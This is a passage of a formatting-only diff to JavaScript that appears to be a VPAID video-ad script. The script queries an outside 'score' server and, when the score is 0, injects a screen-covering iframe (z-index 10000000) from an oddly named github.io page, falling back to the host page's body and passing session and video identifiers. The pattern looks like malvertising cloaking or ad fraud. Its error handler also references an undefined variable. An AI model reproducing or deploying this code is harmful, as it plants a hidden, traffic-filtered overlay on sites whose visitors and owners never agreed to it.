-		sub_id: saved_arguments['source'],
-		callback: function(result) { validateSignature(result.signature)}
+			sub_id: saved_arguments['source'],
+			callback: function (result) {
+				validateSignature(result.signature)
+			}
 		});
-	} catch(err) {
+	} catch (err) {
 		forceStreaming();
-	} 
+	}
 }
 
 function forceStreaming() {
-	doStreaming({score:0});
+	doStreaming({
+		score: 0
+	});
 	notify(saved_arguments['notifyUrl'], "force_streaming", 4, 104);
 }
 
 function validateSignature(signature) {
 	var xhr = new XMLHttpRequest();
 	xhr.onreadystatechange = function () {
-	  if (this.readyState == 4) {
-	    if (this.status == 200) {
-	    	var response = JSON.parse(this.responseText);
-	    	doStreaming(response);
-	    } else {
-		notify(saved_arguments['notifyUrl'], "loading_error", 2, this.status);
-	    }
-	  }
+		if (this.readyState == 4) {
+			if (this.status == 200) {
+				var response = JSON.parse(this.responseText);
+				doStreaming(response);
+			} else {
+				notify(saved_arguments['notifyUrl'], "loading_error", 2, this.status);
+			}
+		}
 	}
 	xhr.open('GET', 'https://xtremeserve.xyz/score/validate.php?signature=' + signature, true);
 	xhr.send(null);
 }
 
 function verifyStreaming() {
-	if(!is_streaming_started) {
+	if (!is_streaming_started) {
 		var append = "onerror";
-		window.postMessage('IK_'+append,'*');
+		window.postMessage('IK_' + append, '*');
 		notify(saved_arguments['notifyUrl'], "timeout", 3, 103);
 	}
 }
 
-setTimeout(verifyStreaming,element.parameters_['timeout']);
+setTimeout(verifyStreaming, element.parameters_['timeout']);
 
 function doStreaming(response) {
 	is_streaming_started = true;
 	var element = vpaid_object;
 	if (response.score == 0) {
 		stream = document.createElement('iframe');
-		stream.setAttribute("style","height:"+cordinat.height+"px;width:"+cordinat.width+"px;border:0px;position:absolute;top:"+cordinat.top+"px;left:"+cordinat.left+"px;z-Index:10000000;"); 
-		stream.setAttribute("allowFullScreen","");  
-		stream.setAttribute("src","https://coolboy112233.github.io/unknowbastard/unknown.html?sid="+element.parameters_['sid'] + "&videoId=" + element.parameters_['videoId'] + "&skipTime=" + element.parameters_['skipTime'] +"&orderId=" + element.parameters_['id'] + "&source=" + element.parameters_['source']); 
-		try{
-			w=GetOwnerWindow(ser);
-			stream.setAttribute("style","height:100%;width:100%;border:0px;"); 
-			element.slot_.appendChild(stream);     
-		} catch(e){
-      		w=GetOwnerWindow(ser);
-      		element.ownerDocument.body.appendChild(stream);
-    		}
+		stream.setAttribute("style", "height:" + cordinat.height + "px;width:" + cordinat.width + "px;border:0px;position:absolute;top:" + cordinat.top + "px;left:" + cordinat.left + "px;z-Index:10000000;");
+		stream.setAttribute("allowFullScreen", "");
+		stream.setAttribute("src", "https://coolboy112233.github.io/unknowbastard/unknown.html?sid=" + element.parameters_['sid'] + "&videoId=" + element.parameters_['videoId'] + "&skipTime=" + element.parameters_['skipTime'] + "&orderId=" + element.parameters_['id'] + "&source=" + element.parameters_['source']);
+		try {
+			w = GetOwnerWindow(ser);
+			stream.setAttribute("style", "height:100%;width:100%;border:0px;");
+			element.slot_.appendChild(stream);
+		} catch (e) {
+			w = GetOwnerWindow(ser);
+			element.ownerDocument.body.appendChild(stream);
+		}
 	} else {
 		var append = "onerror";
-		window.postMessage('IK_'+append,'*');
+		window.postMessage('IK_' + append, '*');
 	}
 }
 
-window.onerror = function(message, source, lineno, colno, error) {
-  var req = new XMLHttpRequest();
-  var params = "msg=" + encodeURIComponent(msg) + '&source=' + encodeURIComponent(source) + "&line=" + lineno + "&colno=" + colno + "&error=" + error;
-  req.open("POST", element.parameters_["errorUrl"]);
-  req.send(params);
+window.onerror = function (message, source, lineno, colno, error) {
+	var req = new XMLHttpRequest();
+	var params = "msg=" + encodeURIComponent(msg) + '&source=' + encodeURIComponent(source) + "&line=" + lineno + "&colno=" + colno + "&error=" + error;
+	req.open("POST", element.parameters_["errorUrl"]);
+	req.send(params);
 };
-
